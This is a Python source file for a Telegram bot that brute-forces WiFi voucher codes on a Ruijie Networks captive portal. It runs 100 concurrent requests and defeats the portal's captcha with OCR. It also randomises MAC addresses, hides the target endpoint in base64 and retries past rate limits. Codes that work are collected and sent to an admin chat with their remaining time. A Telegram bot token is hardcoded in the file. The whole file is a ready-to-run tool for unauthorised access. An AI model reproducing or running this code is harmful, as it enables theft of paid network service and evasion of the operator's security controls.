import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, sys, logging
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# Termux headless settings
os.environ['OPENCV_IO_ENABLE_OPENEXR'] = '0'
os.environ['QT_QPA_PLATFORM'] = 'offscreen'
cv2.setNumThreads(1)
cv2.ocl.setUseOpenCL(False)

# Logging level reduce
logging.basicConfig(level=logging.ERROR)
logging.getLogger('aiohttp').setLevel(logging.WARNING)
logging.getLogger('telebot').setLevel(logging.ERROR)

BOT_TOKEN = '8998265568:AAH0MyJ9HYkA7E6CelGuaCOnEec4XJivn_0'
ADMIN_ID = "6417845887"
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
retry_counts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 100
_voucher_sem = None
_start_time = time.monotonic()
RESULTS_FILE = "results.json"

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

def load_results():
    try:
        with open(RESULTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_results(data):
    with open(RESULTS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

@bot.message_handler(commands=['start'])
async def start(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Admin only")
        return
    await bot.reply_to(message, "Bot ready. /input")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Admin only")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /input session_url")
        return
    url = args[1]
    if await check_session_url(session_url=url):
        user_data[message.chat.id] = {'session_url': url}
        await bot.reply_to(message, "Session URL saved. Use /scan")
    else:
        await bot.reply_to(message, "Invalid session URL")

@bot.message_handler(commands=['scan'])
async def scan(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Admin only")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /scan <6|7|8|ascii-lower|all>")
        return
    mode = args[1]
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Use /input first")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan already running")
        return
    progress_msg = await bot.send_message(chat_id, "Scanning...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message, progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Admin only")
        return
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        await bot.reply_to(message, "Scan stopped")
    else:
        await bot.reply_to(message, "No active scan")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Admin only")
        return
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Use /input first")
        return
    results = load_results()
    chat_id_str = str(chat_id)
    if chat_id_str not in results or not results[chat_id_str]:
        await bot.reply_to(message, "No codes to recheck")
        return
    await bot.reply_to(message, "Rechecking...")
    recheck_list = []
    for code in results[chat_id_str]:
        recode = await perform_check(user_data[chat_id]['session_url'], code, chat_id, scan_id=None, recheck=True, message=message)
        if recode:
            recheck_list.append(recode)
    results[chat_id_str] = recheck_list
    save_results(results)
    await bot.reply_to(message, f"Rechecked: {len(recheck_list)} codes")

@bot.message_handler(commands=['result'])
async def result(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Admin only")
        return
    results = load_results()
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        await bot.reply_to(message, "Codes:\n" + "\n".join(results[chat_id_str]))
    else:
        await bot.reply_to(message, "No codes found")

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Admin only")
        return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    uptime = int(time.monotonic() - _start_time)
    h, rem = divmod(uptime, 3600)
    m, s = divmod(rem, 60)
    await bot.reply_to(message, f"Uptime: {h}h {m}m {s}s\nActive scans: {active}")

async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results = load_results()
                for item in items:
                    cid = str(item["chat_id"])
                    code = item["code"]
                    if cid not in results:
                        results[cid] = []
                    if code not in results[cid]:
                        results[cid].append(code)
                save_results(results)
            except Exception as e:
                print(f"Save error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f}/min"
    if total is not None:
        pct = (checked / total) * 100
        bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
        return f"Checked: {checked:,}/{total:,} ({pct:.1f}%)\nSpeed: {speed_str}\nFound: {found}\nRetries: {retries}\n[{bar}]"
    return f"Checked: {checked:,}\nSpeed: {speed_str}\nFound: {found}\nRetries: {retries}"

BATCH_SIZE = 2000

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {"session_id": None, "auth_code": None, "lock": asyncio.Lock()}
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, retries)
            try:
                await bot.edit_message_text(chat_id, progress_msg.message_id, text)
            except:
                pass
        if progress_msg:
            await bot.edit_message_text(chat_id, progress_msg.message_id, "Scan completed.")
    finally:
        scan_tasks.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) Chrome/139.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) Chrome/139.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as req:
            return "sessionId" in str(req.url)
    except:
        return False

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    response = None
    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except:
                    pass
            if not auth_code:
                return
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12) Chrome/139.0.0.0"
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except:
                return
        if response and 'request limited' in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break
    if not response:
        return
    if 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"Success:\n\n" + "\n\n".join(success_texts[chat_id]))
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id, success_messages[chat_id], f"Success:\n\n" + "\n\n".join(success_texts[chat_id]))
            except:
                pass
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"Limited:\n\n" + "\n\n".join(limited_texts[chat_id]))
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id, limited_messages[chat_id], f"Limited:\n\n" + "\n\n".join(limited_texts[chat_id]))
            except:
                pass

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    h = int(total_minutes) // 60
    m = int(total_minutes) % 60
    return f"{h}h {m}m" if h > 0 else f"{m}m"

async def Code_Expires_Date(session_id):
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json",
        "user-agent": "Mozilla/5.0 (Linux) Chrome/139.0.0.0",
        "x-requested-with": "XMLHttpRequest"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as fresh_session:
            async with fresh_session.get(f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', headers=headers) as req:
                data = await req.json()
                profile = data.get('result', {}).get('profileName', 'Unknown')
                total = Minute_to_Hour(data.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"Plan: {profile} | Time: {total}"
    except:
        return "Plan: Unknown | Time: Unknown"

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "image/avif,image/webp,*/*",
        "user-agent": "Mozilla/5.0 (Linux) Chrome/139.0.0.0"
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux) Chrome/139.0.0.0"
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None

async def keep_alive():
    while True:
        await asyncio.sleep(300)
        print("Bot alive")

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}, retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected error: {e}, retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False, force_close=True, enable_cleanup_closed=True)
    session = aiohttp.ClientSession(connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        asyncio.create_task(keep_alive())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped")